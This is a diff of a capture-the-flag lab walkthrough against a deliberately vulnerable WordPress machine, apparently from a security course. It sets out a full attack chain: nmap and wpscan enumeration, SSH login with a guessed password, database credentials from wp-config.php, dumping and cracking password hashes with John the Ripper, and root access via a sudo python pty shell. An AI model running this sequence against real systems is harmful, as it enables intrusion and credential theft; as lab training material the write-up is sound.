@@ -8,147 +8,215 @@ To start, your team needs to confirm that newly created alerts are working. Once
 
 You will then report back all your findings to both the SOC manager and the Engineering Manager with appropriate analysis.
 
->##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other methods have been explored. Look at Read Team: Summary of Operation and the PowerPoint presentation to find more methods not specified in this walkthrough.
+>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other techniques have been explored. Look at the PowerPoint presentation and the Penetration Testing Report Target 1 to find more methods not specified in this walkthrough.
 
 ---
 
 Tools:
 
-- nmap
-
-- wpscan
-
-- google developers tool
-
-- Q terminal
-
 - Kali Linux
-
-- ssh
-
+- Q shell
+- Namp
+- Wpscan
+- Google Chrome Browser
+- Google Developers Tool
+- SSH
 - Bash Commands
-
 - Mysql
-
 - John the Ripper
-
 - Python Script
 
 ---
 
 ## **Walkthrough**
 
-1. ` nmap -sV 192.168.1.110`
+1. Run a command to see host IP and network addresses.
 
-    ![1](/Images/2/1.png)
+        ifconfig
 
-2. Enumerate: 
+    ![1](/Images/2/1.PNG)
 
-    `wpscan --url http://192.168.1.110/wordpress -eu`
+2. Network FootPrinting (find machines on the network).
 
-    Likewise, the usernames are easy to guess because of the leads on the website.
+        nmap 192.168.1.0/24
 
-    ![2](/Images/2/wpscan.PNG)
+    ![2](/Images/2/2.PNG)
 
-3. Search with the google developers tool the flag inside the code
+3. Target1 fingerprinting (find services and ports on target1). 
 
-4. Go to Services
-
-5. Search: `flag`
-
-    ![2](/Images/2/2.png)
-
-6. In the terminal: `'ssh michael@192.168.1.110'`
-
-7. Password: `michael` (Method to obtain the password was guessing. It can also be obtained with Hydra)
-
-8. `pwd`
-
-9. `cd ../../`
-
-10. `find  -iname “*flag*” 2>/dev/null`
+        nmap -sV 192.168.1.110
 
     ![3](/Images/2/3.png)
 
-11. `cat /var/www/flag2.txt`
+4. Enumerate with wpscan.
 
-    ![4](/Images/2/4.png)
+        wpscan --url http://192.168.1.110/wordpress -eu
 
-12. `cd /var/www/html/wordpress`
+    **Likewise, the usernames are easy to guess because of the leads on the website.**
 
-13. `Nano wp-config.php`
+    ![4](/Images/2/4.PNG)
+
+5. Find the flag inside the code with the google developers tool.
+
+    - Go to Services.
+
+    - Search: `flag`
+
+    **flag1**
 
     ![5](/Images/2/5.png)
 
-14. `mysql -u root -p`
+6. Access Target1 through SSH from the Kali Linux Terminal.
 
-15. Password: `R@v3nSecurity`
+        ssh michael@192.168.1.110
 
-16. `show databases;`
+7. The method to obtain the password is guessing. It also can be obtained by brute force using Hydra.
+
+    Password: `michael`
 
     ![6](/Images/2/6.png)
 
-17. `use wordpress;`
+8. Look for flags.
+
+        pwd
+
+        cd ../../
+
+        find  -iname “*flag*” 2>/dev/null
 
     ![7](/Images/2/7.png)
 
-18. `show tables;`
+9. Open the file.
+
+        cat /var/www/flag2.txt
+
+    **flag2**
 
     ![8](/Images/2/8.png)
 
-19. `SELECT * FROM wp_users;`
+10. Explore the WordPress directory.
+
+        cd /var/www/html/wordpress
+
+11. Open the wp-config.php file.
+
+        Nano wp-config.php
 
     ![9](/Images/2/9.png)
 
-20. Right click and copy the part with the hashes
+12. Login into MySQL with root user.
+          
+        mysql -u root -p
 
-21. In another terminal in the attacker machine create a file and paste the hashes
+    **Password: `R@v3nSecurity`**
 
-22. Give the appropriate structure for john the ripper use to crack the hashes
+13. Glance databases.
 
-23. nano hashes.txt
+        show databases;
 
     ![10](/Images/2/10.png)
 
-24. `john hashes.txt -wordlist="/usr/share/wordlists/rockyou.txt"`
+14. Use the WordPress database.
 
-    #### If rock you is not descompressed use 'sudo gunzip  /usr/share/wordlists/rockyou.txt.gz' to do it.
-
-25. `john –show hashes.txt`
+        use wordpress;
 
     ![11](/Images/2/11.png)
 
-26. `sudo steven`
+15. Glance tables of the WordPress database.
 
-27. Password: `pink84`
-
-28. `Sudo -l`
+        show tables;
 
     ![12](/Images/2/12.png)
 
-29. `sudo python -c 'import pty;pty.spawn("/bin/bash")'`
+16. SQL query to glance at the wp_user table.
+
+        SELECT * FROM wp_users;
 
     ![13](/Images/2/13.png)
 
-30. `find  -iname “*flag*” 2>/dev/null`
+17. Prepare the Hashes to crack them.
 
-    ![14](/Images/2/14.png)
+ - Select and right-click and copy the hashes.
 
-31. `cat /root/flag4.txt`
+    - Open a new terminal in the Kali Linux machine and create a file called hashes.txt with the nano command.
+    
+    - Paste the hashes on the file.
+
+    - Give the appropriate structure for john the ripper to use.
+
+            nano hashes.txt
+
+        ##### Note: **To exit nano: "CTRL X", then "y" and "enter".**
+
+        ![14](/Images/2/14.png)
+
+18. Crack the hashes with John the Ripper.
+
+        john hashes.txt -wordlist="/usr/share/wordlists/rockyou.txt"
+
+    #### Note: **If an error occurs because "rockyou.txt" is compressed, use: `sudo gunzip  /usr/share/wordlists/rockyou.txt.gz` to decompress**
+
+19. Check the cracked hashes.
+
+        john –show hashes.txt
 
     ![15](/Images/2/15.png)
 
-32. `grep -r flag3 *`
+20. Privilege escalation. Change user to steven.
+
+        sudo steven
+
+    **Password: `pink84`**
+
+21. Glance at privileges of steven.
+
+        Sudo -l
 
     ![16](/Images/2/16.png)
 
-33. `nano /var/lib/mysql/ib_logfile0`
+22. Use python script to use steven's python root privilege to gain root access.
 
-34. `Ctrl w`
-
-35. `flag3`
+        sudo python -c 'import pty;pty.spawn("/bin/bash")'  
 
     ![17](/Images/2/17.png)
+
+23. Search flags.
+
+        find  -iname “*flag*” 2>/dev/null
+
+    ![18](/Images/2/18.png)
+
+24. Open the file.
+
+        cat /root/flag4.txt
+
+    **flag4**
+
+    ![19](/Images/2/19.png)
+
+25. Search flag3.
+
+        cd /var
+
+        grep -r flag3 *
+
+    ![20](/Images/2/20.png)
+
+26. Open the binary file with nano.
+
+        nano /var/lib/mysql/ib_logfile0
+
+27. Use the nano command to search.
+
+        Ctrl w
+
+28. Enter the pattern to look for and hit enter.
+
+        flag3
+
+    **flag3**
+
+    ![21](/Images/2/21.png)
 
 # FLAGS
 
